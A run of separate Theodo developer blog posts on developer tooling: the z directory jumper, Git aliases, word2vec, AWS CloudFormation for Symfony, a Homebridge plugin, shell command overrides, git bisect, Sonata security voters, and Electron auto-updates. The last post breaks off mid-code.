git clone https://github.com/rupa/z.git

In the ./bashrc or ./zshrc shell config file, add the following line at the bottom:
. /path/to/z.sh

To end up the setup, you have to source the freshly updated shell config file:
source ./bashrc

You can also restart your terminal to enable the z command.
From now on, perform your very last cds through your file tree to help Z learn about your habits and enrich its database accordingly.
Trust me, after a day or two, you won’t use cd anymore to reach your daily working project.
CraZy Tips
Let’s take the example of Max who works on his startup website. The path of the project folder is the following one: /home/max/Documents/Very/Long/And/Painful/Path/To/My/Startup/Website
Given that Max frecently cd into it since Z installation, he can simply run the command z website to reach it. z web or even z w can do the magic too since the folder is the best match.
Z script is smart enough to change the current directory based on the regex you provided.
To get the ordered list of visited folders, type z -l in your terminal.
97.5       /home/max/Documents/path/to/Happiness
128        /home/max/Documents/path/to/Success
256        /home/max/Documents/path/to/Startup/Fundraising/Investors
408        /home/max/Documents/path/to/Startup/Legal
544        /home/max/Documents/path/to/Startup/Marketing
822        /home/max/Documents/Very/Long/And/Painful/Path/To/My/Startup/Website

As you can see, you also get the current mark of each folder. The next section deals with the Maths behind the scenes.
To retrieve information about ranking or timing, you can use the z -r or z -t commands.
The Frecency Algorithm
Frecency is a blend of ‘frequency’ and ‘recency’ words. The algorithm that computes the folders ranking is pretty simple and crazy damn powerful.
We have to consider it as a two dimensional problem with two variables: rank and time.
The rank is a metric to assess frequency whereas time is the date of folder last visit, stored as a timestamp in seconds.
First part: each time a folder is visited its rank is incremented by one unit and its time is updated.
Second part: frecency formula
If the current folder has been visited during the:

last hour: frecency = rank * 4
last day: frecency = rank * 2
last 7 seven days: frecency = rank / 2

Otherwise, frecency = rank / 4
By default, Z uses the frecency to compute the best match. However, you can use -r and -t options to respectively cd into the best matching folder based only on ranking or time criteria.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Yohan Levy
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										As programmers, we use Git everyday.
The time saved by a good Git config is remarkable!
In particular, amongst the most useful features of Git is the ability to create your own Git commands.
Aliases
You probably know about aliases.
Who still has time to type git status? In 2017?
We all have the usual co = checkout or st = status in our .gitconfig, we’re here for sexier stuff.
Here is a compilation of useful aliases I’ve created, adapted or shamelessy stolen from the interwebs.
Feel free to take and share:
[alias]
    ###########################################
    # The essentials
    ###########################################
    # -sb for a less verbose status
    st = status -sb
    # Easy commits fixup. To use with git rebase -i --autosquash
    fixup = commit --fixup
    # If you use Hub by Github
    ci = ci-status

    ###########################################
    # The command line sugar
    ###########################################
    # Pop your last commit out of the history! No change lost, just unindexed
    pop = reset HEAD^
    # Fix your last commit without prompting an editor
    oops = commit --amend --no-edit
    # Add a file/directory to your .gitignore
    ignore = ""!f() { echo \""$1\"" >> .gitignore; }; f""
    # A more concise and readable git log
    ls = log --pretty=format:""%C(yellow)%h\\ %Creset%s%Cblue\\ [%cn]\\%Cred%d"" --decorate
    # Same as above, with files changed in each commit
    ll = ls --numstat
    # Print the last commit title & hash
    last = --no-pager log -1 --oneline --color

    ###########################################
    # This much sugar may kill you
    ###########################################
    # Show which commits are safe to amend/rebase
    unpushed = log @{u}..
    # Show what you've done since yesterday to prepare your standup
    standup = log --since yesterday --author $(git config user.email) --pretty=short
    # Show the history difference between a local branche and its remote
    divergence = log --left-right --graph --cherry-pick --oneline $1...origin/$1
    # Quickly solve conflicts using an editor and then add the conflicted files
    edit-unmerged = ""!f() { git diff --name-status --diff-filter=U | cut -f2 ; }; vim `f`""
    add-unmerged = ""!f() { git diff --name-status --diff-filter=U | cut -f2 ; }; git add `f`""

What is the bang for?
Note the git ignore command, alias to ""!f() { echo \""$1\"" >> .gitignore; }; f"".
This looks weird, let’s explain it:
The ! allows to escape to a shell, like bash or zsh.
Then, we define a function f() that does what we want (here, appending the first argument to .gitignore).
Finally, we call this function.
I’ve had a lot of trouble understanding why using a function is necessary, as the shell escaping does interpret positional parameters such as $1.
It’s actually a neat trick: git appends your parameters to your expanded command (it is an alias after all) which leads to unwanted behavior.
Let’s see an example:
Let’s say you have the alias echo = !echo ""echoing $1 and $2"".
$ git echo a b
echoing a and b a b

Wow! What happened?
Git expanded your alias escaping to a shell, which interpreted positional parameters.
It means that $ git echo a b was equivalent to $ echo ""echoing a and b"" a b, hence the output.
Now wrapped in a function: echo = ""!f(){ echo ""echoing $1 and $2""; };f"".
In this case, $ git echo a b is equivalent to $ f(){ echo ""echoing $1 and $2"" }; f a b.
The parameters still are appended (not interpreted by the shell because they’re function parameters), but they are used in the call to the f function!
Writing your own commands
Aliases are great, and their power is almost unlimited when using the !f(){...};f trick.
But you need to escape quotes and new lines, you don’t have syntaxical coloration and it makes your ~/.gitconfig very long and unreadable.
What if you want to do really complex stuff?
Doeth not despair, for I have the solution.
It happens that Good Guy Git is looking in your $PATH when you call it with a command: typing $ git wow will look for an executable named git-wow everywhere in your $PATH!
This means you can define your own git commands easily by writing eg bash, python or by compiling an executable.
Let’s do that.
Here is a simple git-wip bash script, that takes all changes and commit them with a “WIP” commit message.
If the last commit message already was “WIP”, amend this commit instead:
#!/usr/bin/env bash

git add -A

if [ ""$(git log -1 --pretty=%B)"" = ""WIP"" ]; then
    git commit --amend --no-edit
else
    git commit -m ""WIP""
fi

And its friend, git-unwip that undo the last commit if its commit message was “WIP”, else it’s a no-op:
#!/usr/bin/env bash

if [ ""$(git log -1 --pretty=%B)"" = ""WIP"" ]; then
    git pop # defined as an alias, remember!
else
    echo ""No work in progress""
fi

Put these two scripts in your $PATH (/usr/local/bin for exemple), and you can call git wip or git unwip until your fingers bleed.
That’s all folks
Now run along kids, and go create your own aliases and custom commands!
Why not a script to start a new feature branch (sync with remote, prune local branches, create a new branch), or a script to open GitHub pull requests on multiple branches?

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				William Duclot
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										What is word vectorization?
Word vectorization refers to a set of techniques that aims at extracting information from a text corpus and associating to each one of its word a vector. For example, we could associate the vector (1, 4, -3, 2) to the word king. This value is computed thanks to an algorithm that takes into account the word’s context. For example, if we consider a context of size 1, the information we can extract from the following sentence:
The king rules his kingdom
is a set of pairs:
(the king), (king rules), (rules his), (his kingdom)
If we now consider another sentence:
I see a king
and the associated pairs:
(I see), (see a), (a king)
We notice that we have 2 similar pairs across the 2 sets: (the king) and (a king)
The and a appear in the same context, so their associated vectors will tend to be similar.
By feeding the word vectorization algorithm a very large corpus (we are talking here about millions of words or more), we will obtain a vector mapping in which close values imply that the words appear in the same context and more generally have some kind of similarity, may it be syntactic or semantic.
Depending on the text, we could have for example an area in the embedded space for programming languages, one for pronouns, one for numbers, and so on. I will give you a concrete example by the end of this article.
Ok, I get the concept, but why is it interesting?
This technique goes further than grouping words, it also enables algebraic operations between them. This is a consequence of the way the algorithm processes the text corpus. What it means is that you can do:
king - man + woman
and the result would be queen.
In other words, the word vectorization could have associated the following arbitrary values to the words below:
king = (0, 1)
queen = (1, 2)
man = (2, 1)
woman = (3, 2)
And we would have the equality:
king - man + woman = queen
(0, 1) - (2, 1) + (3, 2) = (1, 2)
If the learning was good enough, the same will be possible for other relationships, like
Paris - France + Spain = Madrid
frontend + php - javascript = backend
To sum up, you can play with concepts by adding and subtracting them and get meaningful results from it, which is amazing!
The applications are multiple:

You can visualize the result by projecting the embedded space to a 2D space
You can use these vectors to feed another more ambitious machine learning algorithm (a neural network, a SVM, etc.). The ultimate goal is to allow machines to understand human language, not by learning it by heart but by having a structured representation of it, as opposed to more basic representations such as 1-hot-encoding like the following, where each dimension is a word:

the = (1, 0, 0, 0, 0, 0, 0)
a = (0, 1, 0, 0, 0, 0, 0)
king = (0, 0, 1, 0, 0, 0, 0)
queen = (0, 0, 0, 1, 0, 0, 0)
man = (0, 0, 0, 0, 1, 0, 0)
woman = (0, 0, 0, 0, 0, 1, 0)
his = (0, 0, 0, 0, 0, 0, 1)
Sounds great! Where do I start?
The tutorial below shows how to simply achieve and visualize a word vectorization using the Python Tensorflow library. For information I will use the Skip-gram model, which tends to learn faster than its counterpart the Continuous Bag-of-Words model. Detailing the difference is out of the scope of this article but don’t hesitate to look it up if you want!
I was curious about what I would get by running the algorithm with a text corpus made of all the articles from the Theodo blog, so I used the BeautifulSoup python library to gather the data and clean it. For information there are about 300 articles, each one containing an average of 1200 words, which is a total of 360 000 words. This is very little but enough to see some interesting results.
Step 1: Build the dataset
We first need to load the data, for example from a file:
filename = 'my_text.txt'with open(filename, ""r+"") as f:
    data = tf.compat.as_str(f.read())
Then we strip it from its punctuation and split it in an array of words:
data = data.translate(None, string.punctuation)
data = data.split()
And we homogenize the data:
words = []
for word in data:
    if word.isalpha():
        words.append(word.lower())
    elif is_number(word):
        words.append(word)
The data should now look like the following:
[the, day, words, became, vectors, what, is, word, vectorization, ...]
We also need to adapt the data so it has the structure the algorithm expects. This begins to be a bit technical, so I advise you to use functions from the official word2vec examples you can find here. You should use the build_dataset (line 66) function with as arguments the words array you built before and the size of the vocabulary you want. Indeed it is a good practice to remove the words that don’t appear often, as they will slow down the training and they won’t bring any meaningful result anyway.
Step 2: Train the model
Now that we have our dataset, we need to build our set of batches, or contexts, as explained previously, remember:
(the king), (king rules), (rules, his), (his kingdom)
To do this, we use the generate_batch function.
To properly train the model, you can look at the end of the example (line 131) . All parameters’ purpose is detailed, but in my opinion the ones that are worth tweaking when you begin are:

embedding_size: the dimension of the resulting vector depends on the size of your dataset. A dimension too small will reduce the complexity your embedded space can grasp, a dimension too big may hinder your training. To start I recommend to keep the default value of 128.
skip_window: the size of the context. It is safe to start with one, i.e. considering only neighbours, but I encourage you to experiment with higher values.
number_of_steps: Depending on your corpus size and your machine CPU, you should adapt this if you don’t want to wait too long for your results. For my corpus it took around 4 minutes to complete the 100 000 steps.

Step 3: Analyze the results
The word2vec example lets us visualize the result by reducing the dimension from a very large value (128 if you stick to default) to 2D. For information it uses a t-SNE algorithm, which is well-suited for visualizing high-dimensional data as it preserves as much as possible the relative distance between neighbours.
Here is the result I got:

 
It is too dense to read, so see below an extract of what I got from my dataset:
 

We can see we have an area with pronouns in the top, and one with auxiliaries to the left.
The relations highlighted just above were syntactic ones. On this other extract, we see semantic similarities:
 

The algorithm learned that node is a backend framework!
However with these few words, the model was not good enough to perform meaningful operations between vectors. I guess Theodoers need to write more blog articles to feed the word vectorization algorithm!
You can see below what word vectorization is capable of with this example coming from the Tensorflow page:

Conclusion
I hope that I managed in this article to share my enthusiasm for the rise of word vectorization and all the crazy applications that could ensue! If you are interested, I encourage you to look at papers that treat this subject more deeply:

A more complete implementation example with Tensorflow
You can also dive into this Kaggle competition that contains a lot of information about how to tackle a real use case


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Alexandre Blondin
  			
  				Developper at Theodo  			
  		
    
			

									"
"
										I decided to follow an advice shared on twitter via the The Practical Dev: the best way to learn AWS is to start using it.
The problem
I was looking for a way to quickly create a Minimum Viable Stack on AWS with the following properties:

Be setup in less than 10min
Be able to run a Symfony application
Using PostgreSQL on RDS
Deployment is easy and fast
Non AWS experts can create the MVS

But I couldn’t find any out-of-the-box tools so I looked for a solution. Here I describe my journey which ended up with a ready-to-go CloudFormation configuration.
Elastic Beanstalk
I started working with Elastic Beanstalk, the PAAS of AWS, which seemed to be exactly what I needed. Thanks to this article on Elastic Beanstalk configuration files and this one on how to deploy a Symfony application, I was able to run my application after some debugging cycles. My problem after that was that I couldn’t reuse my configuration to recreate the whole environment (Elastic Beanstalk instances + RDS instance) for a new project so I chose to experiment using CloudFormation.
CloudFormation
CloudFormation is an AWS service that creates a complete stack (VPC, load balancers, web servers, ..) from a template file.If you want to learn how to use CloudFormation, I recommend you to start by learning the basic templates. I started from a sample Elastic Beanstalk template and changed it so it can run a Symfony App. Here are the steps you need to perform in order to use my template:
Step 1: Because we will pass to the Elastic Beanstalk server the information to connect to the RDS postgresql database through environment variables, you need to update your parameters.yml with the following values:
database_host: ""%env(DB_HOST)%""
database_port: 5432
database_name: ""%env(DB_NAME)%""
database_user: ""%env(DB_USER)%""
database_password: ""%env(DB_PASSWORD)%""

Step 2: Ensure you have specified the driver to “pdo_pgsql” in the “app/config/config.yml” file.
Step 3: Upload a zip file with all your code to a s3 bucket. You create the zip file with this command:
zip -r code.zip . --exclude=*vendors*`
Step 4: Download my CloudFormation template.
Step 5: Go to your AWS console and open the CloudFormation and click on “create new stack”.
Step 6: Enter the required information:

Step 7: Click on “next”, “next” and check “I acknowledge that AWS CloudFormation might create IAM resources.”. Then you can click on create. If everything is fine then you should see something like this:

Step 8 : You can check the Elastic Beanstalk page to see if everything went okay and find the url of your project at the top of the page.

Security remark: the password of your database will be available on the AWS console in the config section. A better solution would be to use an s3 file that will be copied during the initialisation of the Elastic Beanstalk container using .ebextensions files or using KMS and DynamoDB.
Configure the Elastic Beanstalk environment
Your site is online but you will want to update it. To do that you need to follow those steps:

Ensure you don’t have a .elasticbeanstalk directory
Run “eb init“, choose your region and the application you just created. You can find the name in the Elastic Beanstalk page.

Now you are ready, you can deploy new version of your code simply with “eb deploy“.
Conclusion
CloudFormation is a powerful tool with some drawbacks:

It only works with AWS
It’s not easy to write beautiful code for the infrastructure

To help you write CloudFormation templates, you can try Troposphere. An alternative to using CloudFormation is to use Terraform. You can find an objective benchmark between the two tools here.
Bonus: tips to debug your elastic beanstalk application
Here are some tips you may need to debug you app:

If you are using GIT, to deploy the app on your EB instance, you may need to create a branch called “codecommit-origin”
You can get the logs of the app in the EB service on the aws console
The code that is deployed on your EB instances is automatically stored in a S3 bucket that you can access on the AWS console
You can ssh into the EB instance with the “eb ssh” command
The application user is webapp and you can get a bash with the following command: “sudo -u webapp /bin/bash”. It’s useful if you want to use the Symfony command without being root.
If you create through the aws console a RDS database the default name of the database is ebdb. You can find it in the RDS service in the aws console


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										Why Homekit?
Homekit is a home accessories management framework developed by Apple.
It allows Apple devices’ owners to control connected objects from different manufacturers using a single interface. It enhances Siri’s capability to interpret commands intended for those devices.
Homekit is particularly interesting, over other connected objects protocols like Home Assistance, if you own an iPhone and an AppleTV. Homekit is native on iPhone, allowing easy control of your appliances through Home app and quick access tab. The apple TV will behave as a hub allowing you to set up automation tasks and to control your home from outside of your home network.
How does it work?
Homekit Accessory Protocol
Homekit defines a layout for your home and your connected objects.

Home: A home represents a single dwelling that has a network of accessories
Room: Each home may have multiple rooms and accessories added to each room.
Platform: A group of accessories.
Accessory: An accessory is a physical home automation device.
Bridge: A bridge is a special type of accessory that allows you to communicate with accessories that can’t communicate directly with HomeKit. For example, a bridge might be a hub for multiple lights that use a communication protocol other than HomeKit Accessory Protocol.
Service: A service correspond to an accessory’s function. A garage door may have a service to open and close the door as well as another service to turn on and off the garage light.
Characteristic: Each service has a set of properties called characteristics. The garage door has a Current Door State and a Target Door State boolean. Each characteristic of a service identifies its current state. Each characteristic has 3 permission levels: read, write and notify. You can find a list of services and associated characteristics here.

Each request made using your iOS devices Home application or Siri will use this layout to understand which object you want to act on and what action you would like to trigger.
However, as of today, only a small number of Homekit enabled devices are available on the market. For other devices, you need a proxy between Homekit and your device. Most connected object manufacturers define their own way to interact with their devices (API and protocols). Your proxy will receive Homekit requests and translate them according to your device interface.
Homebridge
The proxy used for this article is a NodeJS server called Homebridge written using HAP-node.js. Homebridge instantiate a Bridge Homekit object that you will be able to add through your Home application on your iOS devices. It then supports Plugins, which are community-contributed modules that provide a basic bridge from HomeKit to each of your various “smart home” devices.
Many home automation devices plugins have already been developed by the community (like Nest, Lifx and even all of Home Assistant compatible devices).
If no plugin is available today for your object, this tutorial is made for you.

Writting your own plugin
Prerequisites

You need to have Homebridge installed and running on any device of your LAN. You can follow these instructions.
You need to add Homebridge as an accessory to your Home application on iOS.

Instructions
Let’s code a plugin for a fake switch.
Create a new repository containing a package.json file to manage our dependancies, and a index.js file that will contain our plugin core logic.
We will made the following assumption regarding our switch API:

it can be controlled through a RESTful API over HTTP protocol on our LAN
the switch IP address on our LAN is 192.168.0.10
GET requests made to /api/status returns a boolean representing switch current state. Doing so will read the On characteristic of the switch
POST requests made to /api/order containing a boolean representing the switch target state will trigger the corresponding action. Doing so will set the On characteristic of the switch

We will create a Homebridge plugin registering a new Accessory with two services:

AccessoryInformation service, required for every accessory, whatever the type, broadcasting information related to the device itself
Switch service, corresponding to our actual switch. Such service has a single On boolean required characteristic (check the list of services and corresponding characteristics)

First, we need to inject our plugin within homebridge.
mySwitch is the javascript object that will contain our control logic.

const Service, Characteristic;

module.exports = function (homebridge) {
  Service = homebridge.hap.Service;
  Characteristic = homebridge.hap.Characteristic;
  homebridge.registerAccessory(""switch-plugin"", ""MyAwesomeSwitch"", mySwitch);
};

The core logic built within HAP-node.js and Homebridge is located wihtin the getServices prototype function of mySwitch object.
We will instanciate our services in this function. We will also define which getter and setter of each characteristic of each service it shall call on every requests received from Homekit.
We need to instanciate :

an AccessoryInformation service containing:

a Manufacturer characteristic
a Model characteristic
a SerialNumber characteristic


a Switch service containing:

an On characteristic – the only required characteristic of this service



Unlike AccessoryInformation service’s characteristics, which are readable and can be set at plugin initialization, the On characteristic is writable and require a getter and setter.

mySwitch.prototype = {
  getServices: function () {
    let informationService = new Service.AccessoryInformation();
    informationService
      .setCharacteristic(Characteristic.Manufacturer, ""My switch manufacturer"")
      .setCharacteristic(Characteristic.Model, ""My switch model"")
      .setCharacteristic(Characteristic.SerialNumber, ""123-456-789"");

    let switchService = new Service.Switch(""My switch"");
    switchService
      .getCharacteristic(Characteristic.On)
        .on('get', this.getSwitchOnCharacteristic.bind(this))
        .on('set', this.setSwitchOnCharacteristic.bind(this));

    this.informationService = informationService;
    this.switchService = switchService;
    return [informationService, switchService];
  }
};

We will now write the logic of On characteristic getter and setter within dedicated prototype function of mySwitch object.
We will make the following assumption regarding the RESTful API offered by the switch :

GET requests on http://192.168.0.10/api/status returns a { currentState: } reflecting the switch current state
POST requests on http://192.168.0.10/api/order sending a { targetState: } reflecting desired target state set the switch state

We will use request and url modules to perform our HTTP requests.
Our configuration object, defined within Homebridge global configuration JSON, will contain both URLs described above.

const request = require('request');
const url = require('url');

function mySwitch(log, config) {
  this.log = log;
  this.getUrl = url.parse(config['getUrl']);
  this.postUrl = url.parse(config['postUrl']);
}

mySwitch.prototype = {

  getSwitchOnCharacteristic: function (next) {
    const me = this;
    request({
        url: me.getUrl,
        method: 'GET',
    }, 
    function (error, response, body) {
      if (error) {
        me.log('STATUS: ' + response.statusCode);
        me.log(error.message);
        return next(error);
      }
      return next(null, body.currentState);
    });
  },
  
  setSwitchOnCharacteristic: function (on, next) {
    const me = this;
    request({
      url: me.postUrl,
      body: {'targetState': on},
      method: 'POST',
      headers: {'Content-type': 'application/json'}
    },
    function (error, response) {
      if (error) {
        me.log('STATUS: ' + response.statusCode);
        me.log(error.message);
        return next(error);
      }
      return next();
    });
  }
};

We can now add our newly created plugin to Homebridge by installing it globally:
npm install -g switch-plugin
Open the config.json file located in your Homebridge directory in your favorite text editor. In the accessory section, add info to the array:

{
  ""accessory"": ""MyAwesomeSwitch"",
  ""getUrl"": ""http://192.168.0.10/api/status"",
  ""postUrl"": ""http://192.168.0.10/api/order""
}

Restart Homebridge and you shall now be able to switch on and off this fake switch through Home app on your iOS device.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Frédéric Barthelet
  			
  				Currently developing loopback applications at Theodo. Also crazy about IoT and everything connected.  			
  		
    
			

									"
"
										One week ago, our production server was down for a few seconds because the command supervisorctl reload had restarted the server. 
Thus, I made some research to prevent the command to be run again with the reload option.
The first clue Stack Overflow gave me, was to create a new binary file with the name of this command and to change my path variable to override the native one. This has side effects: your binary files can be used by other scripts that you don’t know of, or worse, you can introduce security breaches by change the the user’s rights of your binary file … Moreover, this solution let you only override the whole command.
Finally, aliases saved my life (or at least, my server’s life).
To override a command, in your .bashrc file, create a function with the exact same name. For instance if you want to make fun of one of your colleagues, you can do: 

More seriously, you can test the argument given to your command and specify different behaviours: and override the option(s) you want to:

If your command works with flags, you should use getopts, which have a nicer syntax.
With this trick you can prevent users to run --force, --rf and some other dangerous options on your production servers. But remember, as the joke shows, it’s just a safeguard, not a real security.
Please feel free to share your tips as well!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Aurore Malherbes
  			
  				Web Developer at Theodo  			
  		
    
			

									"
"
										Over my last working year, I have worked on two big projects, both more than 18 months old with several scrum teams working on it. And both facing a few regressions in production each week.
Although I knew it existed and how it worked, I was not aware of the utility of git bisect and had never used it until a few weeks ago. Following a recommendation from the lead developer of my project, I started to use it to solve the regressions we were facing. And I feel like it may be the best way to do it.
Why ?
You will have the lines of code which introduced the regression in less than 10 minutes. Git bisect allows you to go through 1000 commits in 10 iterations; as an indication, in my current 3-4 developers team, 1000 commits represent about 3 months of work.
Moreover, you will be able to find the dev who introduced the code. If you can reach them:

You will easily have the context of why this buggy code was introduced, pointing out what you should be careful not to break while solving the bug
You will help them progress. Finding out that some code you wrote was buggy because of this precise side effect, and that this was the best way to do it, is a very efficient way to get better.
Most of all, you will be able to identify what information they lacked not to do this mistake, and thus which action to take to prevent similar regressions from happening.

Having the code and the context will help you a lot to find a solution to fix the bug.
How ?
The idea is really simple. Starting from two commits, one where the feature worked, and a more recent one with the feature broken, git bisect will perform a dichotomy to find the commit introducing the regression.
In practice, check out the current version of your code and start bisecting:
git bisect start

Since the feature is currently broken, inform git that this version contains the buggy commit:
git bisect bad

You will now need to find a state where the feature worked. It may be an older reliable release, or you may as well just go through your history to find a maybe one or two months old commit with the feature working.
Once you found it, mark this version as reliable:
git bisect good v2.1.13

Or:
git bisect good e627db2fc0a8ff1da6a67b5482c3f56dbedfaba1

The bisection will now actually start. Git checks out the commit in the middle of these two commits and you simply need to build your code and check whether the feature works or not. Indicate the result with git bisect good or git bisect bad and iterate. After a few iterations (git prompts you the number of required iterations after each step), you will have your faulty commit!
For more details on the options of the git bisect command, refer to the official git documentation
NB: This is one more reason for making usable (i.e. with the application build working) and unitary commits. Without it, git bisect will be either harder to use or less useful, since finding out the faulty lines in a big commit might not be easy.
My personal story
To illustrate my point, let me give you an example where the git bisection helped me. The regression I had to solve was a 15 pixels margin missing under the images and title of a given page:

A naive solution could have been to simply add a margin-bottom to the div containing those pictures. The regression would be solved, but we would have no idea of what caused it, and if it (or a similar one) would happen again.
Using git bisect, I found out that it was introduced about a month earlier. The margin-bottom still existed, but the property display: inline-block; had been removed from the <a> tag under the image, and thus the margin no longer applied. The css class applied to this tag being shared in the entire website, it was clear to me that the developer had changed it to improve another page design but forgot to check if it broke something on the images page. I could therefore move the margin-bottom from the <a> tag, where it was no longer needed, to the div containing the image and the text.
Yet, I checked with him, and it appeared that my hypothesis was completely wrong. He did check the broken page, but since a missing margin does not catch the eye, he didn’t notice the regression. The fix was still valid, but we learnt something else from this talk: to properly test the design of a page, one should compare the design before and the design after, to make sure that the changes only affect the desired parts.
As illustrated by this example, git bisect will allow you to quickly find the fix to the regressions you may be facing. But what makes it truly valuable is that it will also give you the root causes of these regressions, helping you to find the right actions to make sure that they won’t happen again.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Miret
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										You think that your entities need some finer access controls?
Changing the url in your admin panel gives access to hidden forms?
You’ve heard of ACL (Access Control List) but can’t really see it as a feasible solution?
If so then you’re just like me.
I’ve started working on a decently sized project with a backend powered by Sonata for the last few weeeks when I was tasked with granting edit access for certain admins to edit an entity they own and nothing else.
Problem: My problem was that my security configuration was set to use Roles and the application itself was too big to switch to an ACLs approach.
If this is also your case then let me take you through my solutions.
Some context for easier understanding
Let’s imagine a really simple application.
You are the president of a group managing hundreds of hotels all over the world each supervised by a different general manager.
Your application is to be used both by you and each manager to store information about each of to store and manage information on each of those hotels.
Now in this simplest form, the application need to have two entities. A User and a Hotel entity.
Based on those requirement, you have two roles emerging:


President: He should be able to list, show, edit, create, delete all Hotel object. He is basically the super admin.


General Manager: He should only be able to show and edit a single object. Only one Hotel.
One of those role will be given to a User object at creation. 


This means that your security.yml has to look something like that:
#app/config/security.yml
ROLE_GENERAL_MANAGER:
    - ROLE_APP_ADMIN_HOTEL_SHOW
    - ROLE_APP_ADMIN_HOTEL_EDIT
ROLE_SUPER_ADMIN: [ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]

This gives too much right to the general manager.
He can easily acces any hotel information simply by changing the id that will appear in the url when he is accessing his own.
What can we do to fix that?
The quick and dirty way
The part where the request is handled is the controller. So the first thing that comes to mind is to put the security logic there.
For that we need to understand that sonata uses a default CRUD controller for all of its admin classes. To implement our custom logic, we need to override this behaviour.
We start by extending the current controller in our bundle and implement our little security logic.
// AppBundle/Controller/CRUDController.php
class CRUDController extends Controller
{
    /**
     * Override the default editAction to only allow a General Manager to modify it's hotel
     *
     * @param $id
     * @return Response
     */
    function editAction($id = null)
    {
        $user = $this->getUser();
        // We assume here that the user has a function that return the Hotel he is managing
        $hotel = $user->getHotel();
        if ($user->hasRole('ROLE_GENERAL_MANAGER') and $id != $hotel->getId()) {
            throw new AccessDeniedException();
        }

        return parent::editAction($id);
    }
}

And then we add the controller as the one to be used by the Hotel admin.
app.admin.hotel:
    class: AppBundle\Admin\Hotel
    tags:
      - { name: sonata.admin, manager_type: orm, group: app }
    arguments: [null, AppBundle\Entity\Hotel, AppBundle:CRUD]

Now each time we try to edit an hotel we are not managing we will get the desired 403 error.
This way of doing things have two main disadvantages.

We don’t have access to the object itself which could be useful to implement the ownership logic.
Our security logic is present in the controller and not isolated.

Security voters
If we look at the code in the sonata default CRUD controller we can notice those 3 lines of code checking for access on an instance of an entity.
if (false === $this->admin->isGranted('EDIT', $object)) {
    throw new AccessDeniedException();
}

Behind the scene, the isGranted function will start the voter security process of Symfony.
It will ask voters to decide if the current user can perform an action (here “EDIT”) on a certain object.
The voters will then judge and give out an answer.
To handle the case of multiple voters, it is useful to change the voting strategy to unanimous in the security.yml of the application.
This mode means that if any voter were to block access to an object then the access would be blocked even if another one were to allow access.
This allows for a finer security configuration by stacking voters on the same class of object based on different conditions.
This can be done by adding the following:
# app/config/security.yml
security:
  access_decision_manager:
    strategy: unanimous

To get back to our hotel and it’s security, to ban General Manager from modifying the hotel that do not belong to them, we need to define a security voter that supports “EDIT” and the Hotel class.
To do that, we need to extend the base Voter class and override two of its functions:
// AppBundle\Security\HotelVoter.php
class HotelVoter extends Voter
{
    private $decisionManager;

    public function __construct(AccessDecisionManagerInterface $decisionManager)
    {
        $this->decisionManager = $decisionManager;
    }

    protected function supports($attribute, $object)
    {
        // if the attribute isn't one we support, return false
        if (!in_array($attribute, array(""ROLE_APP_HOTEL_EDIT""))) {
            return false;
        }

        // only vote on Hotel objects inside this voter
        if (!$object instanceof Hotel) {
            return false;
        }

        return true;
    }

    protected function voteOnAttribute($attribute, $object, TokenInterface $token)
    {
        $user = $token->getUser();
        if (!$user instanceof User) {
            // the user must be logged in; if not, deny access
            return false;
        }

        // ROLE_SUPER_ADMIN can do anything
        if ($this->decisionManager->decide($token, array('ROLE_SUPER_ADMIN'))) {
            return true;
        }

        return $user === $object->getManager();
    }
}

All that’s left is to register the security voter as a service with the right tags:
# AppBundle/Resource/voters.yml
app.hotel_voter:
  class: AppBundle\Security\HotelVoter
    tags:
      - name: security.voter

Now when our crafty admin try to access any hotel he is not managing, he will be faced with desired 403 error 😉

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Michaël Mollard
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										If you are a web developer, you would be amazed by the possibilities that a desktop application offers.
Just give a look at the applications listed on electron website to have a quick glance of the infinite opportunities offered by such a technology.
Few key features:

Access to the filesystem (see Atom)
Access to the webcam and mike (see Dischord)
Access to the command line interface within your app (see Hyper)

The problem is: How can you keep your speed and ease of reaching your users when you develop a desktop application ?
Meet, Squirrel:

This little open-source framework aims to simplify installers for desktop softwares.
When correctly set up, it enables your application to watch for new releases deployed on a server and to automatically update itself from the downloaded files.
Electron auto-updater gives you an API to easily plug Squirrel to your application.
This sounds great, but when I recently tried to implement this feature for a Windows application, I had a hard time to understand how every pieces fit together.
I will give you a quick glance of what I learned doing this, and explain how the update loop of a Squirrel application works.
The framework also works on Mac but the server implementation is slightly different:
To use Squirrel for Mac with Electron, check this article which helped me a lot when implementing the feature.
Prepare your application to watch Squirrel
Ok to have a common base of code, let’s say we will implement this feature on the Electron Quick Start and use it as an example.
This is a real minimal electron application and we will use only two files in it: Main.js and package.json.
Git clone the repository and here we go.
First thing to make your application listen to your Squirrel server, you’ll need to use the electron.auto-updater API.
Add this script which is going to make your app watch for server updates.
const electron = require('electron');
const squirrelUrl = ""http://localhost:3333"";

const startAutoUpdater = (squirrelUrl) => {
  // The Squirrel application will watch the provided URL
  electron.autoUpdater.setFeedURL(`${squirrelUrl}/win64/`);

  // Display a success message on successful update
  electron.autoUpdater.addListener(""update-downloaded"", (event, releaseNotes, releaseName) => {
